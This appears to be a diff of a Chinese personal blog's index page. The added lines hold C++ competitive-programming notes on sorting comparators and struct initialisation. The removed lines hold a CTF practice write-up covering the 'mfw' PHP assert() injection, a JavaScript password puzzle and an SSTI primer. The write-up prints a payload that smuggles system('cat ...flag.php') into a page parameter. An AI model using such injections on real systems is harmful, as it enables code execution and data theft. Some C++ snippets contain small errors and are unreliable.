@@ -160,7 +160,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle">nanashi</p>
+        <p class="site-subtitle">熟能生巧</p>
       
   </div>
 
@@ -262,6 +262,126 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/re.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/re.html" itemprop="url">re</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-03-27T23:53:31+08:00">
+                2024-03-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><img src="/../img/image-20240327235405326.png" alt="image-20240327235405326"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
     
       
 
@@ -379,6 +499,33 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> arr[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	sort(arr,arr+<span class="number">10</span>,greater&lt;<span class="type">int</span>&gt;());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">10</span>;j++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,arr[j]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cout &lt;&lt; arr[j] &lt;&lt; &quot; &quot;; //空格隔开</span><br></pre></td></tr></table></figure>
+
+<h3 id="末尾严格控制空格"><a href="#末尾严格控制空格" class="headerlink" title="末尾严格控制空格"></a>末尾严格控制空格</h3><p>知道个数时，判断结尾</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for(int i=1;i&lt;=6;i++)&#123;</span><br><span class="line">	if(i!=6)&#123;</span><br><span class="line">		cout &lt;&lt; B[i] &lt;&lt; &quot; &quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		cout &lt;&lt; B[i] &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure>
+
+<p>不知道个数时,判断开头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for(int i=1;i&lt;=6;i++)&#123;</span><br><span class="line">	if(i==1)&#123;</span><br><span class="line">		cout &lt;&lt; B[i]; </span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		cout &lt;&lt; &quot; &quot; &lt;&lt; B[i];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 C++ 的标准库中，<code>sort</code> 函数可以接受一个比较函数作为参数，以便在排序时确定元素的顺序。这个比较函数需要满足一定的条件，它应该接受两个参数（通常是被比较的两个元素），并返回一个布尔值，表示两个元素的比较结果。如果返回 <code>true</code>，则第一个参数应该排在第二个参数之前；如果返回 <code>false</code>，则第一个参数应该排在第二个参数之后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bool cmp(int x,int y)&#123; //函数名可以随意</span><br><span class="line">	return x&gt;y;</span><br><span class="line">&#125;</span><br><span class="line">sort(arr,arr+10,cmp);</span><br></pre></td></tr></table></figure>
+
+<h3 id="结构体赋初值"><a href="#结构体赋初值" class="headerlink" title="结构体赋初值"></a>结构体赋初值</h3><p>对于开发更加复杂的程序，我们往往会许哟啊构造函数在初始化的过程中做很多事情，但是对于竞赛 来说，我们只需要构造函数给结构体赋初值就行了，所以我们其实可以使用另一种更加简单的方式，初始化列表，来直接对结构体成员进行初始化：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span>&#123;</span><br><span class="line">	<span class="type">int</span> score;</span><br><span class="line">	string name;</span><br><span class="line">	<span class="built_in">student</span>() &#123;&#125; <span class="comment">//注意不可省略默认构造函数</span></span><br><span class="line">	<span class="built_in">student</span>(string n,ing s): <span class="built_in">name</span>(n),<span class="built_in">score</span>(s) &#123;&#125; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>如上所示，初始化列表的写法是，在构造函数的括号后面加一个冒号，然后按照<code>成员变量（参数）</code>的格式，依次对每一个变量进行初始化，彼此之间用逗号隔开。</p>
+<p>示例：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span>&#123;</span><br><span class="line">	string name;</span><br><span class="line">	<span class="type">int</span> score;</span><br><span class="line">	<span class="built_in">student</span>() &#123;&#125;</span><br><span class="line">	<span class="built_in">student</span>(string n,<span class="type">int</span> s): <span class="built_in">name</span>(n),<span class="built_in">score</span>(s) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	student stu[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">		<span class="type">int</span> s;</span><br><span class="line">		string n;</span><br><span class="line">		cin &gt;&gt; n &gt;&gt; s;</span><br><span class="line">		stu[i]=<span class="built_in">student</span>(n,s);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">		cout &lt;&lt; stu[i].name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; stu[i].score &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对结构体进行排序：</p>
+<p>输入三个学生的四科分数并按照分数从高到低排序 ，先看第一科，再看第二科依次类推</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span>&#123;</span><br><span class="line">	string name;</span><br><span class="line">	<span class="type">int</span> score[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(student x,student y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(x.score[<span class="number">0</span>]!=y.score[<span class="number">0</span>])&#123;</span><br><span class="line">		<span class="keyword">return</span> x.score[<span class="number">0</span>]&gt;y.score[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(x.score[<span class="number">1</span>]!=y.score[<span class="number">1</span>])&#123;</span><br><span class="line">		<span class="keyword">return</span> x.score[<span class="number">1</span>]&gt;y.score[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(x.score[<span class="number">2</span>]!=y.score[<span class="number">2</span>])&#123;</span><br><span class="line">		<span class="keyword">return</span> x.score[<span class="number">2</span>]&gt;y.score[<span class="number">2</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(x.score[<span class="number">3</span>]!=y.score[<span class="number">3</span>])&#123;</span><br><span class="line">		<span class="keyword">return</span> x.score[<span class="number">3</span>]&gt;y.score[<span class="number">3</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	student stu[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">		cin &gt;&gt; stu[i].name;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">			cin &gt;&gt; stu[i].score[j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">sort</span>(stu,stu+<span class="number">3</span>,cmp);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">		cout &lt;&lt; stu[i].name &lt;&lt; <span class="string">&quot;: &quot;</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">			cout &lt;&lt; stu[i].score[j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>排序函数的名字是可以随意命名的，也可以同时定义多个排序函数，根据实际情况调用</p>
+<p><img src="/../img/image-20240323172043832.png" alt="image-20240323172043832"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;algorithm&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int N,l1,r1,l2,r2;</span><br><span class="line">	int score[105];</span><br><span class="line">	scanf(&quot;%d%d%d%d%d&quot;,&amp;N,&amp;l1,&amp;r1,&amp;l2,&amp;r2);</span><br><span class="line">	for(int i=0;i&lt;N;i++)&#123;</span><br><span class="line">		scanf(&quot;%d&quot;,&amp;score[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	sort(score+l1-1,score+r1);</span><br><span class="line">	sort(score+l2-1,score+r2,greater&lt;int&gt;());</span><br><span class="line">	for(int i=0;i&lt;N;i++)&#123;</span><br><span class="line">		if(i==0)&#123;</span><br><span class="line">			printf(&quot;%d&quot;,score[i]);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			printf(&quot; %d&quot;,score[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>排序两个数的所有位相加的和从小到大，如果相同则比较原数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bool cmp(int a,int b)&#123;</span><br><span class="line">	int aa=a,bb=b;</span><br><span class="line">	int suma = 0,sumb = 0;</span><br><span class="line">	while(a)&#123;</span><br><span class="line">		suma+=a%10;</span><br><span class="line">		a/=10;</span><br><span class="line">	&#125;</span><br><span class="line">	while(b)&#123;</span><br><span class="line">		sumb+=b%10;</span><br><span class="line">		b/=10;</span><br><span class="line">	&#125;</span><br><span class="line">	if(suma ==sumb)&#123;</span><br><span class="line">		return aa&lt;bb;</span><br><span class="line">	&#125;</span><br><span class="line">	return suma &lt;sumb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
           
@@ -1811,232 +1958,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/%E5%88%B7%E9%A2%98.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="yzklov">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/%E5%88%B7%E9%A2%98.html" itemprop="url">刷题</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-10-10T14:34:53+08:00">
-                2023-10-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h3><p>Git是一个版本控制系统，在配置不当的情况下，可能会导致<code>.git</code>文件夹被直接部署到线上环境中，这可能会导致Git泄露问题</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> <span class="number">1</span><span class="string">&#x27;) or system(&#x27;</span>cat+./templates/flag.php<span class="string">&#x27;);// . &quot;.php&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// I heard &#x27;</span>..<span class="string">&#x27; is dangerous!</span></span><br><span class="line"><span class="string">assert(&quot;strpos(&#x27;</span><span class="variable">$file</span><span class="string">&#x27;, &#x27;</span>..<span class="string">&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// TODO: Make this look nice</span></span><br><span class="line"><span class="string">assert(&quot;file_exists(&#x27;</span><span class="variable">$file</span><span class="string">&#x27;)&quot;) or die(&quot;That file doesn&#x27;</span>t exist!<span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">```</span></span><br></pre></td></tr></table></figure>
-
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=&#x27;) or system(&#x27;cat ./templates/flag.php&#x27;);//</span><br></pre></td></tr></table></figure>
-
-<p>传入之后变成：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file=&quot;templates/&#x27;) or system(&#x27;cat ./templates/flag.php&#x27;);//.php&quot;</span><br></pre></td></tr></table></figure>
-
-<p>strpos()返回false，再利用or让其执行system函数，再用” &#x2F;&#x2F; “将后面的语句注释掉</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(&quot;strpos(&#x27;template/&#x27;) or system(&#x27;cat ./template/flag.php&#x27;);//.php, &#x27;..&#x27;) === false&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>下划线内容被注释掉了，所以assert执行了以下语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(&#x27;template/&#x27;) or system(&#x27;cat ./template/flag.php&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p><code>or</code>:如果表达式1为 <code>true</code>，那么整个逻辑或操作返回 <code>true</code>，不会再去计算表达式2,这被称为”短路评估”,如果表达式1为 <code>false</code>，那么整个逻辑或操作会继续评估表达式2，如果表达式2为 <code>true</code>，则整个操作返回 <code>true</code>，否则返回 <code>false</code></p>
-<p>右键查看源代码</p>
-<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927110013408.png" alt="image-20230927110013408"></p>
-<h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">dechiffre</span>(<span class="params">pass_enc</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> tab  = pass_enc.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">var</span> tab2 = pass.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);<span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;i = <span class="number">0</span>;j = tab.<span class="property">length</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        k = j + (l) + (n=<span class="number">0</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        n = tab2.<span class="property">length</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                <span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        o = tab[i-l];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(tab2[<span class="number">17</span>]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        pass = p;<span class="keyword">return</span> pass;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    h = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&#x27;Enter password&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(h) );</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>代码实际上就是将pass的用逗号分隔的数字当作ascii转换为字母，无论dechiffre函数传参什么，结果都是 <code>FAUX PASSWORD HAHA</code><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927123112312.png" alt="image-20230927123112312"></p>
-<p>可以直接猜测dechiffre函数传参的那一串转换为文本</p>
-<p>16进制转字符串：<a target="_blank" rel="noopener" href="https://www.bejson.com/convert/ox2str/">https://www.bejson.com/convert/ox2str/</a></p>
-<p><code>55,56,54,79,115,69,114,116,107,49,50</code></p>
-<p>ascii转文本：<a target="_blank" rel="noopener" href="https://www.67tool.com/number/ascii-to-text">https://www.67tool.com/number/ascii-to-text</a></p>
-<p><code>786OsErtk12</code></p>
-<h3 id="初探SSTI"><a href="#初探SSTI" class="headerlink" title="初探SSTI"></a>初探SSTI</h3><p><code>MVC</code>是一种框架型模式，全名是Model View Controller,即模型－视图－控制器,这是一种业务逻辑、数据、界面显示分离的组织代码方式，便于web网站的维护和开发</p>
-<p><code>模型</code>：处理数据验证，<code>控制器</code>：在模型和视图之间传递数据，<code>视图</code>：显示信息给用户</p>
-<p>过程：用户的输入请求通过 View 接收，交给 Controller ，然后由 Controller 调用 Model ，验证信息后返回正确或错误给 Controller， Controller要求处理相应（正确则显示相应信息，错误404）的视图返回给浏览器。</p>
-<p>模板（ssti漏洞产生原因）：是View 中会大量地用到的一种技术，用于定义数据如何渲染成最终的用户界面，而用户的输入由view接收，用户的恶意输入未经任何处理就将其作为 Web 应用模板内容的一部分，而模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，就会导致敏感信息泄露、代码执行、GetShell 等问题，这样的服务器端模板引擎漏洞就是ssti漏洞。</p>
-<h3 id="常见的模板引擎"><a href="#常见的模板引擎" class="headerlink" title="常见的模板引擎"></a>常见的模板引擎</h3><p>Python：jinja2、 mako、 tornado（框架）、 django</p>
-<p>php：smarty、 twig</p>
-<p>java：jade、 velocity</p>
-<p>模板引擎生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，放到渲染函数里，生成模板+用户数据的前端html页面，最后反馈给浏览器。大部分模板引擎有提供沙箱隔离机制 , 但存在沙箱逃逸技术来绕过，这个后面再了解</p>
-<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927230411892.png" alt="image-20230927230411892"></p>
